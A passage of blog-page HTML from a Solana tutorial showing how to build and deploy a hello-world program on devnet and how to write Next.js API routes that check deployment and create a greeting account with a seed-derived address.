class=\"language-sh\">yarn run solana:build:program\n&quot;solana:build:program&quot;: &quot;cargo build-bpf --manifest-path=contracts/solana/program/Cargo.toml --bpf-out-dir=dist/solana/program&quot;,</code></pre></div>\n<ul>\n<li><code class=\"language-text\">.so</code> file is shared object file</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">$ solana program deploy /Users/zer0luck/project/app/dist/solana/program/helloworld.so</code></pre></div>\n<h2 id=\"deploying-the-program\" style=\"position:relative;\"><a href=\"#deploying-the-program\" aria-label=\"deploying the program permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Deploying the program</h2>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">☁  Contract [main] ⚡  solana deploy -v --keypair solana-wallet/keypair.json dist/solana/program/helloworld.so\nRPC URL: &lt;https://api.devnet.solana.com&gt;\nDefault Signer Path: solana-wallet/keypair.json\nCommitment: confirmed\nProgram Id: &lt;ProgramID&gt;</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">import</span> <span class=\"token keyword\">type</span> <span class=\"token punctuation\">{</span>NextApiRequest<span class=\"token punctuation\">,</span> NextApiResponse<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'next'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>Connection<span class=\"token punctuation\">,</span> PublicKey<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@solana/web3.js'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>getNodeURL<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@figment-solana/lib'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> path <span class=\"token keyword\">from</span> <span class=\"token string\">'path'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> fs <span class=\"token keyword\">from</span> <span class=\"token string\">'mz/fs'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> <span class=\"token constant\">PROGRAM_PATH</span> <span class=\"token operator\">=</span> path<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token string\">'dist/solana/program'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token constant\">PROGRAM_SO_PATH</span> <span class=\"token operator\">=</span> path<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token constant\">PROGRAM_PATH</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'helloworld.so'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>\n  req<span class=\"token operator\">:</span> NextApiRequest<span class=\"token punctuation\">,</span>\n  res<span class=\"token operator\">:</span> NextApiResponse<span class=\"token operator\">&lt;</span><span class=\"token builtin\">string</span> <span class=\"token operator\">|</span> <span class=\"token builtin\">boolean</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span>network<span class=\"token punctuation\">,</span> programId<span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> url <span class=\"token operator\">=</span> <span class=\"token function\">getNodeURL</span><span class=\"token punctuation\">(</span>network<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> connection <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Connection</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token string\">'confirmed'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// Re-create publicKeys from params</span>\n    <span class=\"token keyword\">const</span> publicKey <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PublicKey</span><span class=\"token punctuation\">(</span>programId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> programInfo <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> connection<span class=\"token punctuation\">.</span><span class=\"token function\">getAccountInfo</span><span class=\"token punctuation\">(</span>publicKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>programInfo <span class=\"token operator\">===</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fs<span class=\"token punctuation\">.</span><span class=\"token function\">existsSync</span><span class=\"token punctuation\">(</span><span class=\"token constant\">PROGRAM_SO_PATH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span>\n          <span class=\"token string\">'Program needs to be deployed with `solana program deploy`'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Program needs to be built and deployed'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>programInfo<span class=\"token punctuation\">.</span>executable<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Program is not executable</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> errorMessage <span class=\"token operator\">=</span> error <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Error</span> <span class=\"token operator\">?</span> error<span class=\"token punctuation\">.</span>message <span class=\"token operator\">:</span> <span class=\"token string\">'Unknown Error'</span><span class=\"token punctuation\">;</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span>errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>Deploy Contract  ⇒ programId ⇒ PublicKey address</li>\n<li>Connection.getAccountInfo(pubkey) ⇒ programInfo ⇒</li>\n</ul>\n<h2 id=\"progmra-storage-create\" style=\"position:relative;\"><a href=\"#progmra-storage-create\" aria-label=\"progmra storage create permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Progmra Storage Create</h2>\n<ul>\n<li>Solana Program non-storage state</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>\n  Connection<span class=\"token punctuation\">,</span>\n  PublicKey<span class=\"token punctuation\">,</span>\n  Keypair<span class=\"token punctuation\">,</span>\n  SystemProgram<span class=\"token punctuation\">,</span>\n  Transaction<span class=\"token punctuation\">,</span>\n  sendAndConfirmTransaction<span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@solana/web3.js'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token keyword\">type</span> <span class=\"token punctuation\">{</span>NextApiRequest<span class=\"token punctuation\">,</span> NextApiResponse<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'next'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>getNodeURL<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@figment-solana/lib'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">as</span> borsh <span class=\"token keyword\">from</span> <span class=\"token string\">'borsh'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// The state of a greeting account managed by the hello world program</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">GreetingAccount</span> <span class=\"token punctuation\">{</span>\n  counter <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">constructor</span><span class=\"token punctuation\">(</span>fields<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>counter<span class=\"token operator\">:</span> <span class=\"token builtin\">number</span><span class=\"token punctuation\">}</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">undefined</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">undefined</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fields<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>counter <span class=\"token operator\">=</span> fields<span class=\"token punctuation\">.</span>counter<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// Borsh schema definition for greeting accounts</span>\n<span class=\"token keyword\">const</span> GreetingSchema <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Map</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>\n  <span class=\"token punctuation\">[</span>GreetingAccount<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>kind<span class=\"token operator\">:</span> <span class=\"token string\">'struct'</span><span class=\"token punctuation\">,</span> fields<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token string\">'counter'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'u32'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// The expected size of each greeting account.</span>\n<span class=\"token keyword\">const</span> <span class=\"token constant\">GREETING_SIZE</span> <span class=\"token operator\">=</span> borsh<span class=\"token punctuation\">.</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span>\n  GreetingSchema<span class=\"token punctuation\">,</span>\n  <span class=\"token keyword\">new</span> <span class=\"token class-name\">GreetingAccount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">type</span> <span class=\"token class-name\">ResponseT</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  hash<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">;</span>\n  greeter<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">greeter</span><span class=\"token punctuation\">(</span>\n  req<span class=\"token operator\">:</span> NextApiRequest<span class=\"token punctuation\">,</span>\n  res<span class=\"token operator\">:</span> NextApiResponse<span class=\"token operator\">&lt;</span><span class=\"token builtin\">string</span> <span class=\"token operator\">|</span> ResponseT<span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span>network<span class=\"token punctuation\">,</span> secret<span class=\"token punctuation\">,</span> programId<span class=\"token operator\">:</span> programAddress<span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> url <span class=\"token operator\">=</span> <span class=\"token function\">getNodeURL</span><span class=\"token punctuation\">(</span>network<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> connection <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Connection</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token string\">'confirmed'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> programId <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PublicKey</span><span class=\"token punctuation\">(</span>programAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> payer <span class=\"token operator\">=</span> Keypair<span class=\"token punctuation\">.</span><span class=\"token function\">fromSecretKey</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Uint8Array</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">GREETING_SEED</span> <span class=\"token operator\">=</span> <span class=\"token string\">'hello'</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Are there any methods from PublicKey to derive a public key from a seed?</span>\n    <span class=\"token keyword\">const</span> greetedPubkey <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> PublicKey<span class=\"token punctuation\">.</span><span class=\"token function\">createWithSeed</span><span class=\"token punctuation\">(</span>\n      payer<span class=\"token punctuation\">.</span>publicKey<span class=\"token punctuation\">,</span>\n      <span class=\"token constant\">GREETING_SEED</span><span class=\"token punctuation\">,</span>\n      programId<span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// This function calculates the fees we have to pay to keep the newly</span>\n    <span class=\"token comment\">// created account alive on the blockchain. We're naming it lamports because</span>\n    <span class=\"token comment\">// that is the denomination of the amount being returned by the function.</span>\n    <span class=\"token keyword\">const</span> lamports <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> connection<span class=\"token punctuation\">.</span><span class=\"token function\">getMinimumBalanceForRentExemption</span><span class=\"token punctuation\">(</span>\n      <span class=\"token constant\">GREETING_SIZE</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Find which instructions are expected and complete SystemProgram with</span>\n    <span class=\"token comment\">// the required arguments.</span>\n    <span class=\"token keyword\">const</span> transaction <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n      SystemProgram<span class=\"token punctuation\">.</span><span class=\"token function\">createAccountWithSeed</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n        fromPubkey<span class=\"token operator\">:</span> payer<span class=\"token punctuation\">.</span>publicKey<span class=\"token punctuation\">,</span>\n        basePubkey<span class=\"token operator\">:</span> payer<span class=\"token punctuation\">.</span>publicKey<span class=\"token punctuation\">,</span>\n        seed<span class=\"token operator\">:</span> <span class=\"token constant\">GREETING_SEED</span><span class=\"token punctuation\">,</span>\n        newAccountPubkey<span class=\"token operator\">:</span> greetedPubkey<span class=\"token punctuation\">,</span>\n        lamports<span class=\"token operator\">:</span> lamports<span class=\"token punctuation\">,</span>\n        space<span class=\"token operator\">:</span> <span class=\"token constant\">GREETING_SIZE</span><span class=\"token punctuation\">,</span>\n        programId<span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Complete this function call with the expected arguments.</span>\n    <span class=\"token keyword\">const</span> hash <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">sendAndConfirmTransaction</span><span class=\"token punctuation\">(</span>connection<span class=\"token punctuation\">,</span> transaction<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>\n      payer<span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n      hash<span class=\"token operator\">:</span> hash<span class=\"token punctuation\">,</span>\n      greeter<span class=\"token operator\">:</span> greetedPubkey<span class=\"token punctuation\">.</span><span class=\"token function\">toBase58</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> errorMessage <span class=\"token operator\">=</span> error <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Error</span> <span class=\"token operator\">?</span> error<span class=\"token punctuation\">.</span>message <span class=\"token operator\">:</span> <span class=\"token string\">'Unknown Error'</span><span class=\"token punctuation\">;</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span>errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h2 id=\"publickey-generate\" style=\"position:relative;\"><a href=\"#publickey-generate\" aria-label=\"publickey generate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PublicKey Generate</h2>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">const</span> programId <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PublicKey</span><span class=\"token punctuation\">(</span>programAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> payer <span class=\"token operator\">=</span> Keypair<span class=\"token punctuation\">.</span><span class=\"token function\">fromSecretKey</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Uint8Array</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token constant\">GREETING_SEED</span> <span class=\"token operator\">=</span> <span class=\"token string\">'hello'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Are there any methods from PublicKey to derive a public key from a seed?</span>\n<span class=\"token keyword\">const</span> greetedPubkey <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> PublicKey<span class=\"token punctuation\">.</span><span class=\"token function\">createWithSeed</span><span class=\"token punctuation\">(</span>\n  payer<span class=\"token punctuation\">.</span>publicKey<span class=\"token punctuation\">,</span>\n  <span class=\"token constant\">GREETING_SEED</span><span class=\"token punctuation\">,</span>\n  programId<span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>ProgramId, payer publickey, random Seed ⇒ PublicKey</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">const</span> lamports <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> connection<span class=\"token punctuation\">.</span><span class=\"token function\">getMinimumBalanceForRentExemption</span><span class=\"token punctuation\">(</span>\n  <span class=\"token constant\">GREETING_SIZE</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Find which instructions are expected and complete SystemProgram with</span>\n<span class=\"token comment\">// the required arguments.</span>\n<span class=\"token keyword\">const</span> transaction <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n  SystemProgram<span class=\"token punctuation\">.</span><span class=\"token function\">createAccountWithSeed</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    fromPubkey<span class=\"token operator\">:</span> payer<span class=\"token punctuation\">.</span>publicKey<span class=\"token punctuation\">,</span>\n    basePubkey<span class=\"token operator\">:</span> payer<span class=\"token punctuation\">.</span>publicKey<span class=\"token punctuation\">,</span>\n    seed<span class=\"token operator\">:</span> <span class=\"token constant\">GREETING_SEED</span><span class=\"token punctuation\">,</span>\n    newAccountPubkey<span class=\"token operator\">:</span> greetedPubkey<span class=\"token punctuation\">,</span>\n    lamports<span class=\"token operator\">:</span> lamports<span class=\"token punctuation\">,</span>\n    space<span class=\"token operator\">:</span> <span class=\"token constant\">GREETING_SIZE</span><span class=\"token punctuation\">,</span>\n    programId<span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>createAccountWithSeed call</li>\n<li>fromPubKey ⇒ Create Account ⇒ lamports Transaction</li>\n<li>basePubKey ⇒ Create Account Address (newAccountPubKey create use basekey)</li>\n<li>seed: Created Account Address use sedd</li>\n<li>lamports : Created Account deposit lamport Quantity (GREETING_SIZE latest balance)</li>\n<li>space: Create Account Alloc Space(Byte), storage</li>\n<li>programID : Created Account Owner Program Pub Key</li>\n<li>newAccountPubKey : Created Pub key ← PublicKey.createWithSeed()</li>\n</ul>\n<h2 id=\"program-getter-data\" style=\"position:relative;\"><a href=\"#program-getter-data\" aria-label=\"program getter data permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Program getter data</h2>\n<ul>\n<li>buffer in data storage</li>\n<li>Data Access ⇒ Data extract ⇒ Well-Defination Struct</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">import</span> <span class=\"token keyword\">type</span> <span class=\"token punctuation\">{</span>NextApiRequest<span class=\"token punctuation\">,</span> NextApiResponse<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'next'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>Connection<span class=\"token punctuation\">,</span> PublicKey<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@solana/web3.js'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>getNodeURL<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@figment-solana/lib'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">as</span> borsh <span class=\"token keyword\">from</span> <span class=\"token string\">'borsh'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// The state of a greeting account managed by the hello world program</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">GreetingAccount</span> <span class=\"token punctuation\">{</span>\n  counter <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">constructor</span><span class=\"token punctuation\">(</span>fields<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>counter<span class=\"token operator\">:</span> <span class=\"token builtin\">number</span><span class=\"token punctuation\">}</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">undefined</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">undefined</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fields<span class=\"token punctuation\">)</span> <span 